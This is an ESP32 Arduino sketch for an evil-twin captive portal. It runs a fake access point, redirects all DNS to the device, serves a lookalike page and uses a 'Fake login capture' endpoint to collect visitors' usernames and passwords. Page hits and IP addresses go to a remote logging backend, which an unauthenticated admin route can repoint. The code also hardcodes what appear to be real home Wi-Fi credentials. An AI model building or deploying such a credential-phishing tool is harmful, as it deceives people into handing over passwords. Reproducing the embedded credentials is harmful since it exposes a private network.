#include <Arduino.h>
#include <WiFi.h>
#include <LittleFS.h>
#include <AsyncTCP.h>
#include <ESPAsyncWebServer.h>
#include <ArduinoJson.h>
#include <HTTPClient.h>
#include <DNSServer.h>
#include <vector>

// Wifi Network Configuration
const char *ssid = "ESP-FakeAP";
const char *password = "Fake12345";

// Backend server URL for logging (replace with your actual backend)
String backendServer = "http://192.168.4.2:5000/log"; // Default, can be updated via /admin?url=NEW_URL

// Create AsyncWebServer object on port 80
AsyncWebServer server(80);
AsyncWebSocket ws("/ws");

// LED state
bool ledState = false;
const int ledPin = 2;

// DNS server for captive portal
const byte DNS_PORT = 53;
DNSServer dnsServer;

// Log queue (for demonstration, not used in this example)
struct LogEntry
{
  String type;
  String ip;
  String data;
};

std::vector<LogEntry> logQueue;

// Template processor for index.html
String processor(const String &var)
{

  if (var == "IP_ADDRESS_AP")
  {
    return WiFi.softAPIP().toString();
  }

  if (var == "IP_ADDRESS_STA")
  {
    return WiFi.localIP().toString();
  }

  if (var == "BACKEND_URL")
  {
    return backendServer;
  }

  return String();
}

// Log function
void sendLog(String type, String ip, String data)
{
  Serial.println("[LOG] " + type + " " + ip + " " + data);

  // Safety check: Don't let the queue eat all the RAM
  if (logQueue.size() < 50)
  {
    logQueue.push_back({type, ip, data});
  }
  else
  {
    Serial.println("Log queue full, dropping log.");
  }
}

void loadConfig()
{
  if (LittleFS.exists("/config.json"))
  {
    File file = LittleFS.open("/config.json", "r");
    JsonDocument doc;

    DeserializationError error = deserializeJson(doc, file);
    if (error)
    {
      Serial.println("Failed to read file, using default configuration");
    }
    else
    {
      // Updated syntax for ArduinoJson 7:
      // This checks if "backend" exists and is a string in one go
      if (doc["backend"].is<String>())
      {
        backendServer = doc["backend"].as<String>();
        Serial.println("Loaded dynamic backend: " + backendServer);
      }
    }
    file.close();
  }
}

void saveConfig(String newUrl)
{
  File file = LittleFS.open("/config.json", "w");
  JsonDocument doc;        // Just declare it
  doc["backend"] = newUrl; // Assignments work directly
  serializeJson(doc, file);
  file.close();
  backendServer = newUrl;
}

// Send the status to all clients
void notifyClients()
{
  ws.textAll(ledState ? "ON" : "OFF");
}

// WebSocket events
void onWebSocketEvent(AsyncWebSocket *server,
                      AsyncWebSocketClient *client,
                      AwsEventType type,
                      void *arg,
                      uint8_t *data,
                      size_t len)
{

  if (type == WS_EVT_CONNECT)
  {
    Serial.println("Client Connected");
    client->text(ledState ? "ON" : "OFF");
  }
}

// Turn on/off LED
void toggleLED()
{
  ledState = !ledState;
  digitalWrite(ledPin, ledState);
  notifyClients();
}

void setup()
{
  Serial.begin(115200);
  pinMode(ledPin, OUTPUT);
  Serial.println("ledPin(2) mode = OUTPUT");

  // LittleFS
  if (!LittleFS.begin(true))
  {
    Serial.println("LittleFS Failed");
    return;
  }
  else
  {
    Serial.println("LittleFS Correct, Loading config...");
    loadConfig(); // Load the dynamic URL from memory
  }

  // WiFi
  WiFi.setAutoReconnect(true);
  WiFi.persistent(true);
  // WiFi.begin(ssid, password);

  // WiFi.softAP(ssid, password);

  // while (WiFi.status() != WL_CONNECTED) {
  //   delay(1000);
  //   Serial.println("Connecting...");
  // }

  WiFi.disconnect(true);
  // Change mode to both Access Point AND Station
  WiFi.mode(WIFI_AP_STA);

  // Connect to your REAL home router so it can see the backend
  WiFi.begin("WE679762", "Steven@#1402#");

  // Still start the Fake AP for victims/users
  WiFi.softAP(ssid, password);

  Serial.println("Fake AP Started");
  Serial.println(WiFi.softAPIP());

  while (WiFi.status() != WL_CONNECTED)
  {
    delay(500);
    Serial.println("Connecting...");
  }

  Serial.println("Local IP (STA):");
  Serial.println(WiFi.localIP());

  // WebSocket
  ws.onEvent(onWebSocketEvent);
  server.addHandler(&ws);

  // Redirect all DNS requests to the ESP32 IP
  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());

  // List files in LittleFS
  Serial.println("Listing files:");
  File root = LittleFS.open("/");

  if (!root)
  {
    Serial.println("Failed to open root");
  }
  else
  {
    Serial.println("root opened successfully");
  }

  File file = root.openNextFile();

  while (file)
  {
    Serial.print("FILE: ");
    Serial.println(file.name());
    file = root.openNextFile();
  }

  Serial.println("Sending boot test log...");
  sendLog("test", "0.0.0.0", "boot");

  // Routes
  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request)
            {
    if (LittleFS.exists("/index.html")) {

      // The 'processor' argument tells the server to swap %IP_ADDRESS% 
      // with the result of our processor function
      request->send(LittleFS, "/index.html", String(), false, processor);


      // fire-and-forget logging (DO NOT BLOCK)
      sendLog("page_hit", request->client()->remoteIP().toString(), "/");

    } else {
      request->send(200, "text/plain", "index.html NOT FOUND");
    } });

  server.on("/api/toggle", HTTP_GET, [](AsyncWebServerRequest *request)
            {
    toggleLED();
    request->send(200, "text/plain", "OK"); });

  // API JSON
  server.on("/api/status", HTTP_GET, [](AsyncWebServerRequest *request)
            {
    String json = "{\"led\":\"" + String(ledState ? "on" : "off") + "\"}";
    request->send(200, "application/json", json); });

  // Fake login capture
  server.on("/api/login", HTTP_POST, [](AsyncWebServerRequest *request)
            {
    if (request->hasParam("username", true) && request->hasParam("password", true)) {
        String user = request->getParam("username", true)->value();
        String pass = request->getParam("password", true)->value();
        String ip = request->client()->remoteIP().toString();
        
        Serial.printf("Login: %s | Pass: %s | IP: %s\n", user.c_str(), pass.c_str(), ip.c_str());
        request->send(200, "text/plain", "Access Denied");
    } else {
        request->send(400, "text/plain", "Missing Parameters");
    } });

  server.on("/api/test", HTTP_GET, [](AsyncWebServerRequest *request)
            { 
              Serial.println("TEST HIT");
              request->send(200, "text/plain", "ESP32 OK"); });

  // GET /admin?url=http://new-ip:5000/log
  server.on("/admin", HTTP_GET, [](AsyncWebServerRequest *request)
            {
    // Check if the user is trying to UPDATE the URL
    if (request->hasParam("url")) {
        String newUrl = request->getParam("url")->value();
        saveConfig(newUrl);
        request->send(200, "text/plain", "URL Updated Successfully");
    } 
    // Otherwise, just serve the admin.html page
    else {
        if (LittleFS.exists("/admin.html")) {
            request->send(LittleFS, "/admin.html", String(), false, processor);
        } else {
            request->send(404, "text/plain", "admin.html not found in LittleFS");
        }
    } });

  // --- Register Static File Serving ---
  // This will now only be reached if the request DID NOT match an API above
  server.serveStatic("/", LittleFS, "/")
      .setDefaultFile("index.html")
      .setFilter([](AsyncWebServerRequest *request)
                 {
          // If the URL starts with /api, return false (don't serve as a file)
          return !request->url().startsWith("/api"); });

  // --- The Catch-All (Optional) ---
  // It's also good practice to add a "Catch-all" handler for the web server
  // This ensures that even if they request a random URL, they get your index.html
  // If it's not an API and not a file in LittleFS, redirect to index
  server.onNotFound([](AsyncWebServerRequest *request)
                    { 
                      // If the user requested something that doesn't exist, just give them the index.html page
                      request->send(LittleFS, "/index.html", "text/html", false, processor); });

  server.begin();
}

void loop()
{
  // Process DNS requests
  dnsServer.processNextRequest();

  // Clean up WebSocket clients (as discussed before)
  ws.cleanupClients();

  // Handle logs one by one
  if (!logQueue.empty())
  {
    // Get the first entry from the queue
    LogEntry entry = logQueue.front();

    // Check if WiFi is actually connected before trying to send to a backend
    // Note: If you are in AP mode, you won't reach an external backendServer
    // unless the backend is also connected to the ESP32's WiFi!
    if (WiFi.status() == WL_CONNECTED || WiFi.softAPgetStationNum() > 0)
    {
      HTTPClient http;
      http.begin(backendServer);
      http.addHeader("Content-Type", "application/json");

      JsonDocument doc;
      doc["type"] = entry.type;
      doc["ip"] = entry.ip;
      doc["data"] = entry.data;

      String output;
      serializeJson(doc, output);

      int httpResponseCode = http.POST(output);
      Serial.printf("HTTP Response code: %d\n", httpResponseCode);
      http.end();
    }

    // Always remove it from queue so it doesn't block the loop
    logQueue.erase(logQueue.begin());
  }
}
